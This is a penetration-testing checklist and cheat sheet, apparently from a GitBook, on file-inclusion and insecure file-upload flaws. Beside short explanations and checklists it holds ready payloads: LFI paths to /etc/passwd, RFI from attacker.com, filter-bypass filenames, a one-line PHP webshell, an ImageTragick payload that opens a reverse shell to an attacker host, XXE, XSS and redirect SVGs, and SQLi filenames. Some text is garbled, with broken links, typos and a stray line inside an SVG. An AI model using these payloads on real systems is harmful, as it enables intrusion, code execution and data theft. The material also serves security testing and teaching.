# File upload

### What is it?

File Inclusion vulnerabilities allow an attacker to include files on a server through the web browser. This can occur in two forms: Local File Inclusion (LFI) and Remote File Inclusion (RFI). LFI exploits enable attackers to read files on the server, while RFI allows attackers to execute arbitrary code by including remote files over the internet.

**A simple example**

* A vulnerable web application has the endpoint /page?file={filename}
* When a request is made, the application dynamically includes the content of the file specified in the query parameter, for example, PHP's include() function: include($filename);
* If an attacker modifies {filename} to a path such as `../../etc/passwd` or a remote URL `http://attacker.com/malicious.php`, they can read sensitive files or execute malicious code.

It's important to note that the specific impact and exploitation techniques can vary depending on server configuration, programming language, and application logic. File Inclusion vulnerabilities can lead to:

* Sensitive data exposure
* Remote code execution
* Cross-site scripting

**Other learning resources:**

* \[To be updated]

**Writeups:**

Have a good writeup & want to share it here? Drop me a message on [LinkedIn.](https://www.linkedin.com/in/kayemba-h-99082a96/)

### Checklist

* [ ] What is the technology stack you're attacking?
  * [ ] What server-side language is being used (PHP, JSP, ASP, etc.)
  * [ ] Is the application running on a standard web server (Apache, Nginx, IIS)?
* [ ] Identify potential injection points
  * [ ] URL parameters
  * [ ] Form fields
  * [ ] HTTP headers (e.g., Referer, User-Agent)
* [ ] Test for Local File Inclusion (LFI)
  * [ ] Can you access local files? (e.g., ../../../etc/passwd)
  * [ ] Test with common Unix and Windows paths
  * [ ] Test for null byte injection (e.g., ../../../etc/passwd%00)
* [ ] Test for Remote File Inclusion (RFI)
  * [ ] Can you include remote files? (e.g., [http://attacker.com/malicious.php)\&#x20](http://attacker.com/malicious.php\)\&#x20);
  * [ ] Test for protocol wrappers (e.g., php://, data://)
* [ ] Is user input properly validated and sanitized?
* [ ] Are only allow-listed files allowed to be included?
* [ ] Is the application configured to disallow remote file inclusion?

### Exploitation// Some code

```shellscript
# Basic LFI to read 
/etc/passwd 
../../../../etc/passwd
```

```shellscript
# RFI to execute a remote shell 
http://attacker.com/malicious.php
```

```shellscript
# Using PHP wrappers to bypass restrictions 
php://filter/convert.base64-encode/resource=index.php
```

## Insecure file upload

### What is it?

Insecure File Upload vulnerability is when an application allows uncontrolled and unvalidated upload of files. An attacker can exploit this vulnerability to upload malicious files, like web shells, which can lead to code execution, data leakage, or other types of attacks.

**A simple example**

An application allows users to upload profile pictures without validating the file type and content, or without properly handling the file storage. An attacker can upload a PHP shell script disguised as an image file. When this file is served by the server, the malicious script can be executed.

The impact of insecure file uploads includes:

* Remote Code Execution (RCE)
* Data Leakage
* Server Compromise

**Other learning resources:**

* OWASP: [https://owasp.org/www-community/vulnerabilities/Unrestricted\\\\\_File\\\\\_Upload\&#x20](https://owasp.org/www-community/vulnerabilities/Unrestricted/_File/_Upload\&#x20);
* Swisskyrepo: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

### Checklist

* [ ] Understand the file upload functionality
* [ ] Are there file type restrictions?
* [ ] Are there file size restrictions?
* [ ] Are files renamed after upload?
* [ ] Are files checked for content type matching the extension?
* [ ] Test for bypassing file extension filters
* [ ] Upload a file with a double extension (e.g., .jpg.php)
* [ ] Upload a file with a null byte injection (e.g., .php%00.jpg)
* [ ] Test for malicious content within a file
* [ ] Upload a file with a simple XSS payload in its content
* [ ] Test for inadequate file storage handling
* [ ] Are uploaded files accessible from the internet? (Path/URL guessing)
* [ ] Can other users access the uploaded files?

### Exploitation

```shellscript
# Bypass extension filters
# Note: req server misconfig to execute or the ability to rename once it's up
shell.php.jpg

# Null byte injection
shell.php%00.jpg

# Blocklist bypass
shell.php5
shell.phtmlclick
```

## File upload

```shellscript
# File name validation
    # extension blacklisted:
    PHP: .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
    ASP: .asp, .aspx, .cer, .asa
    Jsp: .jsp, .jspx, .jsw, .jsv, .jspf
    Coldfusion: .cfm, .cfml, .cfc, .dbm
    Using random capitalization: .pHp, .pHP5, .PhAr
    pht,phpt,phtml,php3,php4,php5,php6,php7,phar,pgif,phtm,phps,shtml,phar,pgif,inc
    # extension whitelisted:
    file.jpg.php
    file.php.jpg
    file.php.blah123jpg
    file.php%00.jpg
    file.php\x00.jpg
    file.php%00
    file.php%20
    file.php%0d%0a.jpg
    file.php.....
    file.php/
    file.php.\
    file.
    .html
# Content type bypass
    - Preserve name, but change content-type
    Content-Type: image/jpeg, image/gif, image/png
# Content length:
    # Small bad code:
    <?='$_GET[x]'?>
    
# Impact by extension
asp, aspx, php5, php, php3: webshell, rce
svg: stored xss, ssrf, xxe
gif: stored xss, ssrf
csv: csv injection
xml: xxe
avi: lfi, ssrf
html, js: html injection, xss, open redirect
png, jpeg: pixel flood attack dos
zip: rce via lfi, dos
pdf, pptx: ssrf, blind xxe

# Path traversal
../../etc/passwd/logo.png
../../../logo.png

# SQLi
'sleep(10).jpg
sleep(10)-- -.jpg

# Command injection
; sleep 10;

# ImageTragick
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context

# XXE .svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1
<text font-size="40" x="0" y="16">&xxe;</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>

# XSS svg
<svg onload=alert(document.comain)>.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
File Upload Checklist 3
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert("HolyBugx XSS");
</script>
</svg>

# Open redirect svg
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='https://attacker.com'"
xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
</code>
    
# Filter Bypassing Techniques
# upload asp file using .cer & .asa extension (IIS — Windows)
# Upload .eml file when content-type = text/HTML
# Inject null byte shell.php%001.jpg
# Check for .svg file upload you can achieve stored XSS using XML payload
# put file name ../../logo.png or ../../etc/passwd/logo.png to get directory traversal via upload file
# Upload large size file for DoS attack test using the image.
# (magic number) upload shell.php change content-type to image/gif and start content with GIF89a; will do the job!
# If web app allows for zip upload then rename the file to pwd.jpg bcoz developer handle it via command
# upload the file using SQL command 'sleep(10).jpg you may achieve SQL if image directly saves to DB.

# Advance Bypassing techniques
# Imagetragick aka ImageMagick:
https://mukarramkhalid.com/imagemagick-imagetragick-exploit/
https://github.com/neex/gifoeb
    
# Upload file tool
https://github.com/almandin/fuxploider
python3 fuxploider.py --url https://example.com --not-regex "wrong file type"

https://github.com/sAjibuu/upload_bypass
```

#### Cheatsheet

```shellscript
upload.random123		---	To test if random file extensions can be uploaded.
upload.php			---	try to upload a simple php file.
upload.php.jpeg 		--- 	To bypass the blacklist.
upload.jpg.php 			---	To bypass the blacklist. 
upload.php 			---	and Then Change the content type of the file to image or jpeg.
upload.php*			---	version - 1 2 3 4 5 6 7.
upload.PHP			---	To bypass The BlackList.
upload.PhP			---	To bypass The BlackList.
upload.pHp			---	To bypass The BlackList.
upload .htaccess 		--- 	By uploading this [jpg,png] files can be executed as php with milicious code within it.
pixelFlood.jpg			---	To test againt the DOS.
frameflood.gif			---	upload gif file with 10^10 Frames
Malicious zTXT  		--- 	upload UBER.jpg 
Upload zip file			---	test againts Zip slip (only when file upload supports zip file)
Check Overwrite Issue		--- 	Upload file.txt and file.txt with different content and check if 2nd file.txt overwrites 1st file
SVG to XSS			---	Check if you can upload SVG files and can turn them to cause XSS on the target app
SQLi Via File upload		---	Try uploading `sleep(10)-- -.jpg` as file
```

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-Mc98SRU_YMf-VQ6QyjW%2F-Mc98XubnHvMuxmO__Gd%2Fimage.png?alt=media\&token=53e73826-afd2-4d89-aeeb-d7848266d9f1)
